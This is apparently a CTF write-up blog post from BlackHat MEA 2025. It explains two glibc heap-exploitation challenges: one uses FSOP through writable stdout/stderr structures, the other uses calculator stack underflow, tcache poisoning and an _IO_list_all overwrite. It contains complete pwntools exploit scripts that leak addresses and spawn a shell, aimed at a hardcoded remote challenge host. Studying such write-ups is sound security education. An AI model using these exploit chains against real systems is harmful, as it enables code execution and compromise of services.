---
date: 2025-08-10 10:21:59
layout: post
title: BlackHat MEA 2025 Writeup - pwn
subtitle: calc and file101 challs
description: >-
    
image: >-
  /assets/img/uploads/silver_wolf_warp.png
optimized_image: >-
  /assets/img/uploads/silver_wolf_warp.png
category: ctf
tags:
  - heap challenges
  - FSOP
  - debugging inconsistencies with Docker
author: rosayxy
paginate: true
---

first time playing CTF as Redbud with awesome teammates AND my awesome bf. Had a great time! We came in 9th place overall.

Done file101 and calc challs, which are both pwn stuffs. The other challenge is a kernel pwn made by ptr-yudai, which is obviously too hard for me lol.


## file101

This binary is exceptionally simple, with the source code given just as below:

```c
#include <stdio.h>

void main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  puts("stdout:");
  scanf("%224s", (char*)stdout);
  puts("stderr:");
  scanf("%224s", (char*)stderr);
}

```

We can write into the IO_FILE structures of both `stdout` and `stderr`, so its DEFINITELY an FSOP.

### leak
First we do _IO_2_1_stdout_ leak, just like [in my previous blog](https://rosayxy.github.io/codegate-quals-2025-writeup/)

We write to `flags`, changing it to `0xfbad1800`, and we partially overwrite the `IO_write_base`'s lowest byte. In my previous blog, we have to overwrite the last two bytes because the `IO_write_base`'s lowest byte is `0x3`, but here it is `0x43`, and we use `\n` to cover it to 0xa so that we can leak adjacent libc addresses.

### exploit
After that, we can do a classic `house of` attack. At first, I tried house of apple 2 technique (as shown in the commented code below), but it didn't work. This is because in house of apple 2, we set the flag field to literal "  sh;" (with two space at the beginning), but scanf fails to read in the whitespaces. With some research, I found that [house of cat](https://bbs.kanxue.com/thread-273895.htm) can control the flag field with `/bin/sh\x00` (without leading spaces), so I switched to house of cat technique and it worked.

### exp
```py
from pwn import *
context(log_level = 'debug', arch = "amd64", os = "linux")
# p = process("./chall")
p = remote("34.252.33.37", 32553)
libc  = ELF("./libc.so.6")
p.recvuntil("stdout:\n")
p.sendline(p64(0xfbad1800)+p64(0)*3)
p.recv(0x28)
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("libc_leak: " + hex(libc_leak))
libc_base = libc_leak - 0x2038e0
log.info("libc_base: " + hex(libc_base))
stderr_addr = libc_base + libc.symbols["_IO_2_1_stderr_"]
log.info("stderr_addr: " + hex(stderr_addr))
# fake_io_file = b"  sh;".ljust(0x8, b"\x00")
# fake_io_file += p64(0)*3 + p64(0) + p64(2)
# fake_wfile_addr = stderr_addr - 0x10
# fake_io_file = fake_io_file.ljust(0x68, b"\x00") + p64(libc_base + libc.symbols["system"])
# fake_io_file = fake_io_file.ljust(0x88, b"\x00") + p64(0x205700 + libc_base)
# fake_io_file = fake_io_file.ljust(0xa0, b"\x00") + p64(fake_wfile_addr)
# fake_io_file = fake_io_file.ljust(0xd0, b"\x00") + p64(stderr_addr)

# fake_io_file += p64(libc_base + 0x202228)
fake_wfile_addr = stderr_addr - 0x20
fake_io_file = b"/bin/sh\x00".ljust(0x8, b"\x00") + p64(0)*2
fake_io_file += p64(libc_base + libc.symbols["system"])
fake_io_file = fake_io_file.ljust(0x88, b"\x00") + p64(libc_base + 0x205700)
fake_io_file = fake_io_file.ljust(0xa0, b"\x00") + p64(fake_wfile_addr)
fake_io_file = fake_io_file.ljust(0xc0, b"\x00") + p64(stderr_addr)
fake_io_file = fake_io_file.ljust(0xd8, b"\x00") + p64(libc_base + 0x202228 + 0x30)
# gdb.attach(p)
# pause()
p.recvuntil("stderr:")
p.sendline(fake_io_file)
p.interactive()
```

## calc
Done with the help of our pwn expert k4ra5u and my bf jiegec.

This binary is an implementation of a calculator using a vector as stack(it will be referred to as calc stack to distinguish from the real stack). The problem is that when it executes 2-operand operations (like +, -, *, /), it doesn't check if there are at least two elements in the calc stack. So we can underflow the calc stack (which is a vector on heap).

### heap leak

When we push two elements on the calc stack, it will be allocated to this chunk:

![alt_text](/assets/img/uploads/calc-heapleak.png)

Just in its lower address is a tcache chunk. We use the underflow to make the calc stack's back() to the tcache chunk's lower 4 bytes of fd and leak it. We call the value `heap_leak`.

Then we have a heap address of `heap_base = (heap_leak + 0x500000000)*0x1000`, which is the address of the tcache bin rounded down to 0x1000. (We call it `heap base` to stay consistent with my exp code, but its not really the heap base lol)

### libc leak

Using our knowledge of vectors, the vector grows by doubling its capacity when it runs out of space. The previous allocated space will be freed. So if we push enough elements, we can free an unsorted bin sized chunk, thus leaving libc address on heap.

Using the method like above, we can leak the bk of that unsorted bin chunk, which is `libc_leak`.

Something to mind: When we leak the lower 4 bytes of the bk, we will helplessly cover the higher 4 bytes of the bk to zero, thus the unsorted bin chunk is corrupted. When we free the current vector, it will try to consolidate with the corrupted unsorted bin chunk and crash, so we have to avoid freeing the vector after leaking the libc address.

This is done by using the underflow to modify the current calc stack's chunk's size and set its prev_inuse bit to 1, so that when we free it, it won't consolidate with the corrupted unsorted bin chunk.

Then we have the libc leak without crashing anything XD.

### tcache poisoning

Before this step, we first construct a fake IO_FILE structure on heap, which will be used to do FSOP later.

At first, I doubted whether we can do tcache poisoning or not. Because in my memory, the initial capacity of a vector after an element has been pushed to it is 3, so each time the vector grows, it will alloc a chunk from a different size bin, thus we can't do tcache poisoning.

However, I discussed it with teammate k4ra5u and he questioned it. Thus, I decided to capture the binary's malloc and free calls by attaching pwndbg to it, setting breakpoints on malloc and free, and using the calculator to push elements to the calc stack.

It turns out that the vector mallocs 4 and 8 bytes at the beginning and there are no free calls in between. The two chunks are freed when we malloc from a larger size bin. Therefore we can do tcache poisoning.

This experience taught me that I should not trust my memory too much and always verify it with experiments. To get the evidence from the running binary.

At first, I tried to point the tcache fd to _IO_list_all, and cover the _IO_list_all pointer to a heap address, but it will crash on returning from main. 

This is because when the program exits, it will **deconstruct** the vector and free its buffer. **Even if** we cover the vector's buffer pointer to _IO_list_all, and use underflow to give it a valid size, when we free it, the _IO_list_all pointer will be seen as fd, and our written fake IO_FILE address will be covered up.

### tcache poisoning and house of water

We use the tcache poisoning to alloc to the tcache metadata, and use the underflow to cover the 0x50 entry's pointer to _IO_list_all - 0x10.

See [this blog](https://jia.je/kb/software/glibc_allocator.html#tcache-thread-local-cache) for structure of the tcache metadata.

Then when we malloc a 0x50 chunk, we will get a chunk at _IO_list_all - 0x10. Therefore, we can write a pointer to our constructed fake IO_FILE structure to _IO_list_all.

Then we return from the main function, and it will trigger the IO flow. With our fake IO_FILE structure, we can get code execution and get shell. Thus we have a working exp locally.

### debugging inconsistencies

credit to @jiegec for this part.

I found we cannot get shell remotely, and further checking shows that we cannot write to IO_list_all or tcache metadata remotely.

I called for my bf jiegec for help to try reproducing it using docker locally. When I was still struggling to install peda and pwntools and such inside the image, he has already got the docker running and told me that when running the exp inside the docker, it can getshell. However, when we send the payloads remotely through TCP, it fails.

Here is the way we debugged our exploit over TCP using docker:

1. Dockerfile (credit to jiegec):
```Dockerfile
FROM ubuntu:24.04@sha256:4f1db91d9560cf107b5832c0761364ec64f46777aa4ec637cca3008f287c975e AS base
WORKDIR /app
COPY --chmod=555 chall run
RUN echo "FLAG{*** REDACTED ***}" > /flag.txt
RUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt

RUN sed -i s/archive.ubuntu.com/mirrors.tuna.tsinghua.edu.cn/g /etc/apt/sources.list*/*
RUN apt update && apt install -y gdb fish python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3-pwntools
RUN apt install -y curl wget socat vim
RUN curl -qsL 'https://install.pwndbg.re' | sh -s -- -t pwndbg-gdb
RUN ln -s /usr/local/bin/pwndbg /usr/local/bin/pwntools-gdb


# FROM pwn.red/jail
# COPY --from=base / /srv
# ENV JAIL_TIME=120 JAIL_CPU=100 JAIL_MEM=10M

CMD ["/bin/bash"]
```

We run the docker with the command `docker run -p 5000:5000 -it --privileged --mount type=bind,source="D:\ctf\calc",target=/app/calc  <image id>`

Inside docker, we run command `socat TCP-LISTEN:5000,reuseaddr SYSTEM:/app/run`

Then we test each part of the exp, meaning to comment out the rest of the exp and not sending "quit" so that when our binary waits for input when we send all the payloads in the current stage.

To interact with the binary inside docker, we change the process to `p = remote("localhost", 5000)`

Then we start another shell in docker using `docker exec`, in it, we run `ps aux|grep run` and `pwndbg -p <run pid>` to attach to the running process inside docker and check its heap and IO_list_all status.

![alt_text](/assets/img/uploads/docker_debugging.png)

The inconsistencies are these two:
- The gap between tcache metadata and our freed tcache chunks are 0x1000 larger over TCP
- The fake IO_FILE's address's lower 3 digits are 0x740 while it is 0xb40 locally

### exp working remotely
```py

from pwn import *
context(log_level = 'debug', arch = "amd64", os = "linux")
p = process("./chall")
# p = remote("34.252.33.37",32040)
# 34.252.33.37:32040
# p = process("strace -o ./log ./chall".split(" "))
# p = remote("34.252.33.37", 30500)
# 34.252.33.37:30500
libc = ELF("./libc.so.6")

p.recvuntil("--- Enter code ---\n")

p.sendline("0")
p.sendline("0")
p.sendline("mul")
p.sendline("add")
p.sendline("add")
for i in range(5):
    p.sendline("mul")


p.sendline("add")
p.sendline("end")
p.recvuntil("Result: ")
heap_leak = int(p.recvline().strip())
heap_base = (heap_leak + 0x500000000)*0x1000 # actually it is heap leak
log.info("heap_base: " + hex(heap_base))

# libc leak upper
p.recvuntil("--- Enter code ---\n")
for i in range(0x210):
    p.sendline("0")
p.sendline("add")

for i in range(0x20f):
    p.sendline("add")

p.sendline("add")
p.sendline("mul")


p.sendline("add")
p.sendline("mul")
p.sendline("mul")

for i in range(0x1fa):
    p.sendline("mul")
p.sendline("add")
# gdb.attach(p)
# pause()
p.sendline("end")

p.recvuntil("Result: ")
libc_upper = int(p.recvline().strip())
log.info("libc_upper: " + hex(libc_upper))

# libc leak lower, we need to prevent unsorted bin consolidation

p.recvuntil("--- Enter code ---\n")
for i in range(0x210):
    p.sendline("0")
p.sendline("add")

for i in range(0x211):
    p.sendline("add")

p.sendline("4113")

p.sendline("add")
p.sendline("mul")
p.sendline("add")


for i in range(0x1fc):
    p.sendline("mul")
p.sendline("add")
p.sendline("end")
p.recvuntil("Result: ")
libc_lower = int(p.recvline().strip())
if libc_lower < 0:
    libc_lower += 0x100000000
log.info("libc_lower: " + hex(libc_lower))
libc_leak = (libc_upper << 32) | libc_lower
log.info("libc_leak: " + hex(libc_leak))
libc_base = libc_leak - 0x203b20
log.info("libc_base: " + hex(libc_base))
log.info("heap_base: " + hex(heap_base))

# stuff io_file somewhere

p.recvuntil("--- Enter code ---\n")
for i in range(4):
    p.sendline("0")
fake_io_addr = heap_base + 0x740 # TODO
system_addr = libc_base + libc.symbols["system"]

fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x205700)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x202228+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)

fake_io_bytes = fake_io_file

for i in range(0, len(fake_io_bytes), 4):
    num = u32(fake_io_bytes[i:i+4])
    if num > 0x7fffffff:
        num -= 0x100000000
    p.sendline(str(num))
p.sendline("end")

# # start tcache poisoning
# # 0x5648fa9190e0 0x5648fa92c000
# # 0x20 bin at 0x5648fa919090, 0x30 bin at 0x00005648fa92ca20
# # 0x50 bin at 0x5648fa9190a8 (cover this to IO_list_all) 0x90 bin at 0x5648fa9190c0

log.info("our heap base: " + hex(heap_base))

io_list_all = libc_base + libc.symbols["_IO_list_all"]
tcache_metadata = heap_base - 0x14000 + 0xe0
fd = tcache_metadata ^ (heap_base >> 12)

p.recvuntil("--- Enter code ---\n")
for i in range(5):
    p.sendline("0")

for i in range(7):
    p.sendline("add")
for i in range(6):
    p.sendline("mul")

# alloc to tcache metadata
fd_lower = fd & 0xffffffff
if fd_lower > 0x7fffffff:
    fd_lower -= 0x100000000

fd_upper = (fd >> 32) & 0xffffffff
p.sendline(str(fd_lower))
p.sendline(str(fd_upper))

p.sendline("end")

p.recvuntil("--- Enter code ---\n")
p.sendline("0")
p.sendline(str(0x1337dead))
p.sendline("mul")
p.sendline("mul")
p.sendline("mul")
p.sendline("mul")
p.sendline(str(0x21))
for i in range(13):
    p.sendline("mul")

io_list_all_lower = (io_list_all - 0x10) & 0xffffffff
if io_list_all_lower > 0x7fffffff:
    io_list_all_lower -= 0x100000000
io_list_all_upper = (io_list_all >> 32) & 0xffffffff
p.sendline(str(io_list_all_lower))
p.sendline(str(io_list_all_upper))
p.sendline("end")

p.recvuntil("--- Enter code ---\n")
for i in range(9):
    p.sendline("0")

fake_io_lower = fake_io_addr & 0xffffffff
if fake_io_lower > 0x7fffffff:
    fake_io_lower -= 0x100000000
log.info("libc_base: " + hex(libc_base))
log.info("heap_base: " + hex(heap_base))
for i in range(11):
    p.sendline("mul")
p.sendline(str(0x51))
p.sendline("0")
for i in range(4):
    p.sendline("0")
p.sendline(str(fake_io_lower))
p.sendline(str(fake_io_addr >> 32))
# gdb.attach(p)
# pause()
p.sendline("quit")

p.interactive()
```

## kinc
dunno what to do with the cnt++ though its a UAF.....

## link to jiegec's writeup

https://jia.je/ctf-writeups/2025-09-07-blackhat-mea-ctf-quals-2025/